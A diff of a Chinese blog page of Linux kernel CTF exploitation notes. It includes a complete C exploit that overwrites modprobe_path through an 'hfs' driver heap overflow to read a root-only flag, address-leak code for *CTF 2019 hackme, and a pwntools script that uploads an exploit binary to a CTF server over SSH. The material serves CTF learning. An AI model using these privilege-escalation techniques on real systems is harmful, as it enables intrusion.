class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_CREATE 0xABCD0001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_DELETE 0xABCD0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_READ 0xABCD0003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHANNEL_WRITE 0xABCD0004</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new hfs channel</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_CREATE, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Create %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete hfs channel</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">    ioctl(fd, CHANNEL_DELETE, &amp;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Delete %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read from hfs channel into dest</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">char</span> *dest, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line">    channel.buffer = dest;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_READ, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Read %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write into hfs channel from src</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_channel</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> id, <span class="keyword">char</span> *src, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">channel_info</span> <span class="title">channel</span>;</span></span><br><span class="line"></span><br><span class="line">    channel.id = id;</span><br><span class="line">    channel.size = size;</span><br><span class="line">    channel.buffer = src;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CHANNEL_WRITE, &amp;channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Write %d channel\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/home/user/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/user/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /root/flag /home/user/flag\n/bin/chmod 777 /home/user/flag&#x27; &gt; /home/user/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/user/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/user/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/user/ll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open hfs device\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/hfs&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Create initial channels\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>** payload = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>**)buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> modprobe_addr = <span class="number">0xffffffff81a3f7a0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (count = <span class="number">1</span>; count &lt; <span class="number">0x11</span>; count++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">5</span>) &#123;</span><br><span class="line">            create_channel(fd, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            create_channel(fd, count, <span class="number">0x20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delete_channel(fd, <span class="number">7</span>);</span><br><span class="line">    buf[<span class="number">0x20</span>] = <span class="string">&#x27;\x20&#x27;</span>;</span><br><span class="line">    write_channel(fd, <span class="number">6</span>, buf, <span class="number">0x21</span>);</span><br><span class="line"></span><br><span class="line">    create_channel(fd, <span class="number">0x20</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (count = <span class="number">1</span>; count &lt; <span class="number">5</span>; count++) &#123;</span><br><span class="line">        delete_channel(fd, count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    payload[<span class="number">0</span>] = <span class="number">0x30</span>;</span><br><span class="line">    payload[<span class="number">1</span>] = modprobe_addr;</span><br><span class="line">    payload[<span class="number">2</span>] = <span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">    write_channel(fd, <span class="number">0x20</span>, payload, <span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;/home/user/getflag.sh&quot;</span>);</span><br><span class="line">    write_channel(fd, <span class="number">0x30</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    trigger();</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	exploit();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <h3 id="CTF-2019-hackme"><a href="#CTF-2019-hackme" class="headerlink" title="*CTF 2019 hackme"></a>*CTF 2019 hackme</h3><p>比赛调的时候把smap关掉了，结果在开启kaslr+smep的情况下做出来了，但是没绕过smap。</p>
 <blockquote>
-<p>参考Balsn的exploit：<a href="https://balsn.tw/ctf_writeup/" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/</a></p>
+<p>参考Balsn的exploit：<a target="_blank" rel="noopener" href="https://balsn.tw/ctf_writeup/">https://balsn.tw/ctf_writeup/</a></p>
 </blockquote>
 <p>驱动中的读和写函数存在if检查绕过的情况，使得对slab的读、编辑操作可以向前溢出。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0x30002</span> )                        <span class="comment">// edit</span></span><br><span class="line">&#123;</span><br><span class="line">  idx = <span class="number">2L</span>L * args;</span><br><span class="line">  chunk_ptr = POOL[idx];</span><br><span class="line">  node_addr = &amp;POOL[idx];</span><br><span class="line">  <span class="keyword">if</span> ( chunk_ptr &amp;&amp; offset + size &lt;= (<span class="keyword">unsigned</span> __int64)node_addr[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(offset + chunk_ptr, buffer, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">0x30003</span> )                   <span class="comment">// read</span></span><br><span class="line">&#123;</span><br><span class="line">  idx = <span class="number">2L</span>L * args;</span><br><span class="line">  chunk_ptr = POOL[idx];</span><br><span class="line">  node_addr = &amp;POOL[idx];</span><br><span class="line">  <span class="keyword">if</span> ( chunk_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( offset + size &lt;= (<span class="keyword">unsigned</span> __int64)node_addr[<span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(buffer, offset + chunk_ptr, size);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1L</span>L;</span><br></pre></td></tr></table></figure>
+
 <p>首先通过向前读来泄漏slab和内核堆地址。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> get_heapaddr(<span class="keyword">int</span> fd) &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    memset(buf, '\x00', 0x400);</span><br><span class="line">    </span><br><span class="line">    add(fd, <span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    add(fd, <span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    add(fd, <span class="number">2</span>, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    show(fd, <span class="number">2</span>, readbuf, <span class="number">0x100</span>, <span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> readbuf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> get_kerneladdr(<span class="keyword">int</span> fd) &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    memset(buf, '\x00', 0x400);</span><br><span class="line"></span><br><span class="line">    add(fd, <span class="number">0</span>, buf, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    show(fd, <span class="number">0</span>, readbuf, <span class="number">0xa00</span>, <span class="number">-0xa00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//size_t i = 0;</span></span><br><span class="line">    <span class="comment">//for (i = 0; i &lt; 0xa00/8; i++)</span></span><br><span class="line">    <span class="comment">//    printf("%d=%llx\n", i, readbuf[i]);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> readbuf[<span class="number">25</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_heapaddr</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x400</span>);</span><br><span class="line">    </span><br><span class="line">    add(fd, <span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    add(fd, <span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    add(fd, <span class="number">2</span>, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    show(fd, <span class="number">2</span>, readbuf, <span class="number">0x100</span>, <span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> readbuf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_kerneladdr</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    add(fd, <span class="number">0</span>, buf, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    show(fd, <span class="number">0</span>, readbuf, <span class="number">0xa00</span>, <span class="number">-0xa00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//size_t i = 0;</span></span><br><span class="line">    <span class="comment">//for (i = 0; i &lt; 0xa00/8; i++)</span></span><br><span class="line">    <span class="comment">//    printf(&quot;%d=%llx\n&quot;, i, readbuf[i]);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> readbuf[<span class="number">25</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <h4 id="SMEP开启的情况下"><a href="#SMEP开启的情况下" class="headerlink" title="SMEP开启的情况下"></a>SMEP开启的情况下</h4><h4 id="SMEP-amp-SMAP开启的情况下"><a href="#SMEP-amp-SMAP开启的情况下" class="headerlink" title="SMEP&amp;SMAP开启的情况下"></a>SMEP&amp;SMAP开启的情况下</h4><h3 id="musl-gcc"><a href="#musl-gcc" class="headerlink" title="musl-gcc"></a>musl-gcc</h3><p>从官网下载source code。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure &amp;&amp; sudo make install</span><br><span class="line">sudo cp ./obj/musl-gcc /bin/</span><br><span class="line">musl-gcc --static -Os source.c -o output</span><br></pre></td></tr></table></figure>
+
 <h3 id="Using-SSH-in-pwntools"><a href="#Using-SSH-in-pwntools" class="headerlink" title="Using SSH in pwntools"></a>Using SSH in pwntools</h3><p>马克一下大佬的脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"35.221.78.115"</span></span><br><span class="line">PORT =  <span class="number">10022</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">"pwn"</span></span><br><span class="line">PW = <span class="string">"pwn"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span><span class="params">()</span>:</span></span><br><span class="line">    log.info(<span class="string">"Compile"</span>)</span><br><span class="line">    os.system(<span class="string">"musl-gcc -w -s -static -o3 pwn2.c -o pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"pwn"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">        </span><br><span class="line">    exec_cmd(<span class="string">"cat benc | base64 -d &gt; bout"</span>)    </span><br><span class="line">    exec_cmd(<span class="string">"chmod +x bout"</span>)</span><br><span class="line">    </span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">"/bin/sh"</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">"./startvm.sh"</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;35.221.78.115&quot;</span></span><br><span class="line">PORT =  <span class="number">10022</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">PW = <span class="string">&quot;pwn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span>():</span></span><br><span class="line">    log.info(<span class="string">&quot;Compile&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;musl-gcc -w -s -static -o3 pwn2.c -o pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    p = log.progress(<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;pwn&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">&quot;%d / %d&quot;</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">&quot;echo \&quot;%s\&quot; &gt;&gt; benc&quot;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">        </span><br><span class="line">    exec_cmd(<span class="string">&quot;cat benc | base64 -d &gt; bout&quot;</span>)    </span><br><span class="line">    exec_cmd(<span class="string">&quot;chmod +x bout&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">r</span>):</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">&quot;./startvm.sh&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <blockquote>
 <p>参考资料</p>
-<p><a href="https://bbs.pediy.com/thread-226696.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226696.htm</a></p>
-<p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/" target="_blank" rel="noopener">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/</a></p>
-<p><a href="https://hardenedlinux.github.io/system-security/2016/05/23/kernel_self_protection.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/system-security/2016/05/23/kernel_self_protection.html</a></p>
-<p><a href="https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/" target="_blank" rel="noopener">https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/</a></p>
-<p><a href="https://xz.aliyun.com/t/2054" target="_blank" rel="noopener">https://xz.aliyun.com/t/2054</a></p>
-<p><a href="https://kileak.github.io/ctf/2019/xctf-hackme/" target="_blank" rel="noopener">https://kileak.github.io/ctf/2019/xctf-hackme/</a></p>
-<p><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/" target="_blank" rel="noopener">http://p4nda.top/2018/10/11/ciscn-2017-babydriver/</a></p>
-<p><a href="https://github.com/pwning/public-writeup/tree/master/0ctf2017/knote" target="_blank" rel="noopener">https://github.com/pwning/public-writeup/tree/master/0ctf2017/knote</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-226696.htm">https://bbs.pediy.com/thread-226696.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/</a></p>
+<p><a target="_blank" rel="noopener" href="https://hardenedlinux.github.io/system-security/2016/05/23/kernel_self_protection.html">https://hardenedlinux.github.io/system-security/2016/05/23/kernel_self_protection.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/">https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2054">https://xz.aliyun.com/t/2054</a></p>
+<p><a target="_blank" rel="noopener" href="https://kileak.github.io/ctf/2019/xctf-hackme/">https://kileak.github.io/ctf/2019/xctf-hackme/</a></p>
+<p><a target="_blank" rel="noopener" href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/">http://p4nda.top/2018/10/11/ciscn-2017-babydriver/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pwning/public-writeup/tree/master/0ctf2017/knote">https://github.com/pwning/public-writeup/tree/master/0ctf2017/knote</a></p>
 </blockquote>
 
-      
     </div>
 
     
-
     
-    
-    
-
-    
-
-    
-      
-    
-    
-
     
 
     <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/linux/" rel="tag"># linux</a>
-          
-            <a href="/tags/kernel/" rel="tag"># kernel</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
